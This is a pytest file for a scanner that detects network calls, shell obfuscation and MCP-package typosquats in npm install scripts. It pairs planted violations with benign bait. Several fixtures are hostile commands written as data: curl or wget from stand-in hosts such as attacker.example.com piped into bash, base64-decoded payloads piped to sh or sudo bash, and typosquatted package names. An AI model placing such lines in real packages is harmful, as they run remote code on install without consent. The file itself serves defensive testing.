"""Tests for NpmInstallScriptNetworkGuard — planted-violation + FP-bait per rule."""
from __future__ import annotations

import json

import pytest

from agentsec.guards.npm_install_script_network import NpmInstallScriptNetworkGuard
from tests.guards._common import *  # noqa: F401,F403


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features=set())


# ── install-script-network-call ──────────────────────────────────────────────

def test_postinstall_curl_pipe_bash_fires(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({
            "name": "example-app",
            "scripts": {"postinstall": "curl -fsSL https://attacker.example.com/setup.sh | bash"},
        }),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == "npm-install-script-network/install-script-network-call")
    assert hit.severity == "high"


def test_preinstall_wget_fires(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"preinstall": "wget https://example.com/x.sh -O x.sh && sh x.sh"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/install-script-network-call" for f in findings)


def test_prepare_script_with_network_fires(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"prepare": "husky install && curl https://example.com/track"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/install-script-network-call" for f in findings)


def test_custom_install_script_with_network_fires(tmp_path: Path) -> None:
    """A custom `install` script is the same automatic, no-confirmation class as
    `preinstall`/`postinstall`."""
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"install": "wget -qO- https://x.example/setup.sh | bash"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/install-script-network-call" for f in findings)


@pytest.mark.parametrize(
    "script",
    ["node scripts/curl.js", "node scripts/wget.js", "node scripts/ssh.js", "node scripts/nc.js"],
)
def test_script_named_after_a_network_word_is_safe(tmp_path: Path, script: str) -> None:
    """FP-bait: `curl.js`/`wget.js`/`ssh.js` are script FILENAMES, the same class the `fetch`
    check already excludes (`fetch-assets`) -- the other network words need the same `.` exclusion."""
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"prepare": script}}), encoding="utf-8")
    assert NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_benign_install_script_is_safe(tmp_path: Path) -> None:
    """FP-bait: an ordinary build-step install script with no network command is not flagged."""
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"postinstall": "npm run build"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_network_command_in_non_lifecycle_script_is_safe(tmp_path: Path) -> None:
    """FP-bait: a network command in an ordinary, explicitly-invoked script (not preinstall/
    postinstall/prepare) doesn't run automatically on install and is out of scope."""
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"deploy": "curl -X POST https://api.example.com/deploy"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


# ── mcp-package-typosquat ─────────────────────────────────────────────────────

def test_mcp_sdk_typosquat_fires(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"@modelcontextprotocol/sdkk": "^1.0.0"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == "npm-install-script-network/mcp-package-typosquat")
    assert hit.severity == "high"


def test_exact_trusted_mcp_package_is_safe(tmp_path: Path) -> None:
    """FP-bait: the real, exact trusted package name must not fire on itself."""
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"@modelcontextprotocol/sdk": "^1.0.0"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_unrelated_package_name_is_safe(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"express": "^4.18.0", "lodash": "^4.17.21"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_typosquat_in_dev_dependencies_fires(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"devDependencies": {"fastmcpp": "^1.0.0"}}),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/mcp-package-typosquat" for f in findings)


# ── suppression / applies() ──────────────────────────────────────────────────

def test_pragma_suppresses_all_findings(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({
            "//": "security: allow-npm-install-script-network",
            "scripts": {"postinstall": "curl https://attacker.example.com/x.sh | bash"},
            "dependencies": {"@modelcontextprotocol/sdkk": "^1.0.0"},
        }),
        encoding="utf-8",
    )
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert findings == []


def test_applies_universally(tmp_path: Path) -> None:
    assert NpmInstallScriptNetworkGuard().applies(_prof(tmp_path)) is True


@pytest.mark.parametrize(
    "script",
    [
        "npm run fetch-assets",
        "npm run fetch:data",
        "node-gyp rebuild",
        "husky install",
        "prisma generate",
        "npm run ssh-keygen-helper",
    ],
)
def test_script_name_containing_a_network_word_is_safe(tmp_path: Path, script: str) -> None:
    """FP-bait: `fetch-assets` / `fetch:data` are npm script NAMES, not a network command."""
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"postinstall": script}}), encoding="utf-8")
    assert NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


@pytest.mark.parametrize(
    "script",
    [
        "fetch https://evil.example/x.sh",
        "npm run build && fetch example.com/p",
        "curl -sSL https://example.com/i.sh | sh",
        "node -e \"axios.get(process.env.U)\"",
    ],
)
def test_real_network_command_in_install_script_still_fires(tmp_path: Path, script: str) -> None:
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"postinstall": script}}), encoding="utf-8")
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/install-script-network-call" for f in findings)


@pytest.mark.parametrize("name", ["mcp-servers", "mcp-server2", "fastmcp2", "@modelcontextprotocol/sdks"])
def test_plural_or_version_suffixed_trusted_name_is_not_a_typosquat(tmp_path: Path, name: str) -> None:
    """FP-bait: a near-miss that is itself a plausible, distinct package is not flagged."""
    (tmp_path / "package.json").write_text(json.dumps({"dependencies": {name: "^1.0.0"}}), encoding="utf-8")
    assert NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_deeply_nested_sibling_package_json_does_not_hide_a_real_finding(tmp_path: Path) -> None:
    """A hostile deep-nesting `package.json` anywhere in the repo used to raise RecursionError out
    of `_load`, and the whole guard's already-collected findings (including this one, from a
    DIFFERENT file) were thrown away with it. The real typosquat finding must survive."""
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"@modelcontextprotocol/sdkk": "^1.0.0"}}), encoding="utf-8",
    )
    sub = tmp_path / "sub"
    sub.mkdir()
    (sub / "package.json").write_text("[" * 200_000 + "]" * 200_000, encoding="utf-8")
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert any(f.rule == "npm-install-script-network/mcp-package-typosquat" for f in findings)


# ── install-script-shell-obfuscation ─────────────────────────────────────────

_OBF = "npm-install-script-network/install-script-shell-obfuscation"


@pytest.mark.parametrize(
    ("key", "script"),
    [
        ("preinstall", "echo aGVsbG8= | base64 -d | sh"),
        ("postinstall", "cat payload.txt | bash"),
        ("install", "echo aGk= | openssl base64 -d | sudo bash"),
        ("prepare", "eval \"$(cat setup.txt)\""),
        ("postinstall", "npm run build && source ./env.sh"),
        ("postinstall", "node-gyp rebuild; echo aGk= | base64 --decode > x"),
        ("postinstall", "cat x | pwsh"),
    ],
)
def test_shell_obfuscation_in_lifecycle_fires(tmp_path: Path, key: str, script: str) -> None:
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {key: script}}), encoding="utf-8")
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == _OBF)
    assert hit.severity == "high"


@pytest.mark.parametrize(
    "script",
    [
        "node-gyp rebuild",
        "husky install",
        "prebuild-install || node-gyp rebuild",
        "npm run build | tee build.log",
        "echo done | shasum",
        "cat notes | shuf",
        "node scripts/evaluate.js",
        "npm run resource-eval",
        "node-pre-gyp install --fallback-to-build",
    ],
)
def test_ordinary_lifecycle_scripts_have_no_obfuscation_finding(tmp_path: Path, script: str) -> None:
    """FP-bait: common native-build and hook-install scripts."""
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"postinstall": script}}), encoding="utf-8")
    findings = NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path))
    assert not any(f.rule == _OBF for f in findings)


def test_shell_obfuscation_outside_lifecycle_is_safe(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"release": "echo aGk= | base64 -d | sh"}}), encoding="utf-8",
    )
    assert NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path)) == []


def test_shell_obfuscation_pragma_suppresses(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps({"//": "security: allow-npm-install-script-network", "scripts": {"install": "cat x | sh"}}),
        encoding="utf-8",
    )
    assert NpmInstallScriptNetworkGuard().run(tmp_path, _prof(tmp_path)) == []
